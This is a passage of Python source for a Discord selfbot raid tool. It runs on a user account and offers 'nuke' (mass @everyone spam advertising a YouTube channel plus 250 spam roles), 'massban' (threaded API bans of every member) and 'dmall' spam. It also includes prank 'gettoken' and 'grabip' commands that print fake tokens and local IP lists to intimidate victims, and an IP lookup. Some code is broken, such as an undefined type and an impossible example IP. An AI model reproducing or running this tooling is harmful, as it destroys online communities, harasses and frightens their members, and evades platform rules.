     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     await channels.send(content = "@everyone Nuked by ROG, 6 months of trolling. Sub to https://www.youtube.com/channel/UCBYo604TMmizWIzJ4SXkLfQ")
     
     for xi in range(250):
       await ctx.guild.create_role(name=rolespam)




@client.command()
async def help(ctx):
    await ctx.message.delete()
    await ctx.send("""
    
    ```ROG SelfBot Made By Wernox.```
-----------------------------------------------------
    
    
    ```    Raid commands:
    $raidcommands
    
    Check if the selfbot works:
    $check
    
    Fun commands:
    $funcommands

    Troll commands:
    $trollcommands

    Op commands:
    $opcommands
    
    ```
    
    
    """)


@client.command()
async def raidcommands(ctx):
    await ctx.message.delete()
    await ctx.send("""

    ```ROG SelfBot Made By Wernox```
---------------------------------------------------
    
    ```    Raid commands:
    $nuke
    $spam
    $ccr
    ```
    
    
    """)


@client.command()
async def funcommands(ctx):
    await ctx.message.delete()
    await ctx.send("""

    ```ROG SelfBot Made By Wernox```
-------------------------------------------------------

  
  ``` 
  Fun commands:
    $joke
    $laser
    $hi
    $ohyeah
    $animememe
  ```
  """)


@client.command()
async def trollcommands(ctx):
    await ctx.message.delete()
    await ctx.send("""
    
    ```ROG SelfBot Made By Wernox```
---------------------------------------------

   
   ```
   Troll commands:
  $gettoken
   Make sure to ping the user at $gettoken @user
   
   $grabip
    Make sure to also ping the user example: $grabip @user.
    ```
    
    """)



@client.command()
async def opcommands(ctx):
    await ctx.message.delete()
    await ctx.send(f"""
    
        ```ROG SelfBot Made By Wernox```
---------------------------------------------

   
   ```
   Op commands:
   $iplookup
   Make sure to put a ip at the second thing.
   Example: $iplookup {Fore.GREEN}68.432.422{Fore.WHITE} <<<< an example ip.
    ```
    
    
    """)





@client.command()
async def gettoken(ctx, *, user: discord.User=None):
    await ctx.message.delete()
    print("[!] Runned the command $gettoken.")   
    if not user:
        user = ctx.author
    userid=str(user.id)
    encodedBytes = base64.b64encode(str(userid).encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    username = user.display_name
    discrim = user.discriminator
    end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
    middle = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))

    await ctx.send(f"""
    
    [Got the token of {user}]

    Token: {encodedid}.{middle}.{end}
    
    """)

@client.command()
async def grabip(ctx, *, user: arg):
    await ctx.message.delete()
    import tkinter as tk

    root = tk.Tk()

    root.geometry("500x500")
    root.title("ROG Selfbot")

    label = tk.Label(root, text="Check your console.", font=('Arial', 20))
    label.pack(padx=20, pady=20)


    root.mainloop()
    print("[!] Runned the command $grabip.")
    if not user:
        user = ctx.author
    print("[!] Getting IPS to troll the user....")
    time.sleep(6)
    for x in range(1,256):
        print("192.168.0." + str(x))
    await ctx.send("""
    
    User: Sended in your console.
    IP: Sended to your console.
    
    
    """)



@client.command()
async def massban(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id

    def mass_ban(i):
        sessions = requests.Session()
        sessions.put(
            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
            headers=headers
        )

    for i in range(3):
        for member in list(ctx.guild.members):
            threading.Thread(
                target=mass_ban,
                args=(member.id,)
            ).start()



@client.command()
async def iplookup(ctx, *, ip: str): 
    await ctx.message.delete()
    print("[!] Runned the command $iplookup.")
    ipd = ipdata.IPData(apikey)
    response = ipd.lookup(ip)
    await ctx.send(response)




@client.command()
async def dmall(ctx, *,message: str):
    for member in ctx.guild.members:
        for i in range(100):
            await ctx.send(message)




client.run(token, bot=False)